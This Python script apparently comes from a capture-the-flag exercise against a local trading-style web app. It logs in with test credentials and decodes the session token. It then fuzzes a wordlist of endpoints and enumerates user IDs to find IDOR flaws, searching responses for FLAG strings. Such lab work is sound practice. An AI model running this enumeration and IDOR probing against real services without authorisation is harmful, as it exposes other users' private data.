import requests
import re

base_url = "http://127.0.0.1:32933"

print("="*60)
print("COMPREHENSIVE AUTHENTICATED RECONNAISSANCE")
print("="*60)

# Authenticate
session = requests.Session()
response1 = session.post(f"{base_url}/", data={'username': 'test'}, allow_redirects=False)
response2 = session.post(f"{base_url}/password/test", data={'password': 'test'}, allow_redirects=False)

set_cookie_header = response2.headers.get('Set-Cookie', '')
session_match = re.search(r'session=([^;]+)', set_cookie_header)
session_value = session_match.group(1) if session_match else None
if session_value:
    session.cookies.set('session', session_value, domain='127.0.0.1', path='/')
    print(f"[+] Authenticated. Session: {session_value[:50]}...")

# Extract user_id from session token [base64 decode manually]
import base64
parts = session_value.split('.')
if len(parts) >= 2:
    try:
        # Try to decode the middle part
        payload_b64 = parts[1]
        # Add padding if needed
        padding_needed = 4 - len(payload_b64) % 4
        if padding_needed != 4:
            payload_b64 += '=' * padding_needed
        payload = base64.urlsafe_b64decode(payload_b64)
        print(f"[+] Session payload: {payload}")
    except Exception as e:
        print(f"[-] Decode error: {e}")

# Test common endpoints with larger wordlist
wordlist = [
    # Basic app pages
    'home', 'index', 'main', 'welcome', 'start',
    # User/account
    'user', 'users', 'account', 'accounts', 'profile', 'profiles',
    'me', 'self', 'myaccount', 'my-account', 'my_account',
    # Trading specific
    'trade', 'trades', 'trading', 'order', 'orders', 'position', 'positions',
    'portfolio', 'balance', 'balances', 'wallet', 'wallets', 'asset', 'assets',
    'stock', 'stocks', 'market', 'markets', 'exchange', 'funds',
    # Settings
    'settings', 'config', 'preferences', 'options',
    # Data
    'data', 'api', 'json', 'xml', 'rest',
    # Admin
    'admin', 'administrator', 'manage', 'management', 'panel', 'control',
    # Support
    'help', 'support', 'faq', 'contact', 'about',
    # Session
    'logout', 'login', 'signin', 'signout', 'register', 'signup',
    # Health
    'health', 'status', 'ping', 'ready', 'alive',
]

print("\n[+] Fuzzing endpoints with authenticated session:")
results = {}
for word in wordlist:
    endpoint = f"/{word}"
    resp = session.get(f"{base_url}{endpoint}")
    key = f"{resp.status_code}_{len(resp.text)}"
    if key not in results:
        results[key] = []
    results[key].append((endpoint, resp))

# Print grouped results
for status_len, endpoints in sorted(results.items()):
    status, length = status_len.split('_')
    print(f"\n    Status {status} (len={length}): {len(endpoints)} endpoints")
    for ep, resp in endpoints[:3]:  # Show first 3 of each group
        # Check for flags
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        flag_marker = f" 🚩 {flags}" if flags else ""
        print(f"        {ep}{flag_marker}")
        if flags:
            print(f"\n[!] FULL RESPONSE for {ep}:")
            print(resp.text)

# Try POST endpoints
print("\n[+] Testing POST endpoints with authenticated session:")
post_endpoints = ['/logout', '/api/login', '/api/user', '/api/order', '/api/trade']
for ep in post_endpoints:
    resp = session.post(f"{base_url}{ep}")
    print(f"    POST {ep}: {resp.status_code} (len={len(resp.text)})")
    if resp.status_code not in [404, 405, 500]:
        print(f"        Response: {resp.text[:200]}")

# Check root page with session to see what's different
print("\n[+] Checking root page with authenticated session:")
root = session.get(f"{base_url}/")
print(f"    Status: {root.status_code}")
print(f"    Length: {len(root.text)}")

# Compare with unauthenticated
print("\n[+] Comparing with unauthenticated:")
unauth = requests.get(f"{base_url}/")
if root.text == unauth.text:
    print("    [?] Same content with and without authentication")
else:
    print("    [+] Different content!")
    # Find differences
    import difflib
    diff = list(difflib.unified_diff(unauth.text.splitlines(), root.text.splitlines(), lineterm=''))
    for line in diff[:20]:
        print(f"    {line}")

# Fuzz user IDs for IDOR
print("\n[+] Testing IDOR with different user_id values in URL")
for uid in range(10000, 10050):
    endpoint = f"/user/{uid}"
    resp = session.get(f"{base_url}{endpoint}")
    if resp.status_code != 404:
        print(f"    {endpoint}: {resp.status_code} (len={len(resp.text)})")
        if resp.status_code == 200:
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            if flags:
                print(f"        [!] FLAGS: {flags}")
                print(f"        [!] Full response:\n{resp.text}")

